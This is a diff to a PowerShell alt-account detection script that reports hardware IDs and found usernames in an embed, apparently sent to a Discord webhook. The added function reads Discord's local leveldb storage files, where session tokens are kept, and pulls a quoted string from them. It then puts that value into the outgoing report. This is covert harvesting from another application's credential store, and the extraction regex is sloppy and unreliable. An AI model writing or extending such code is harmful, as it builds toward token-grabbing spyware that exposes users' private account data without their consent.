@@ -26,6 +26,30 @@ function Get-HWID {
 
 $hwid = Get-HWID
 
+# Get Discord username from local files
+function Get-DiscordUsername {
+    $discordPaths = @(
+        "$env:APPDATA\discord\Local Storage\leveldb",
+        "$env:APPDATA\discord\Local Storage\*.log"
+    )
+    
+    try {
+        $tokenFiles = Get-ChildItem -Path "$env:APPDATA\discord\Local Storage\leveldb" -Filter "*.log" -ErrorAction SilentlyContinue
+        foreach ($file in $tokenFiles) {
+            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content -match '"([a-zA-Z0-9_]{2,32})"') {
+                return $Matches[1]
+            }
+        }
+    }
+    catch {
+        return "Unknown"
+    }
+    return "Unknown"
+}
+
+$discordUser = Get-DiscordUsername
+
 # Load stored alts
 $storedAlts = @{}
 if (Test-Path $hwidFile) {
@@ -102,11 +126,11 @@ if ($newAlts.Count -gt 0) {
     Set-Content -Path $hwidFile -Value $encrypted -Force
 }
 
-# Send results in elegant embed format
+# Send results in elegant embed format with Discord username
 if ($newAlts.Count -gt 0) {
     Write-Host "`nNew alts found:" -ForegroundColor Cyan
     $counter = 1
-    $description = ""
+    $description = "**Discord Account:** $discordUser`n`n"
     foreach ($username in $newAlts | Select-Object -Unique) {
         Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
         $description += "$counter. $username`n"
@@ -115,7 +139,7 @@ if ($newAlts.Count -gt 0) {
     
     # Create embed
     $embed = @{
-        title = "🎮 ALT ACCOUNTS DETECTED"
+        title = "ALT ACCOUNTS DETECTED"
         color = 0x9B59B6
         description = $description
         footer = @{
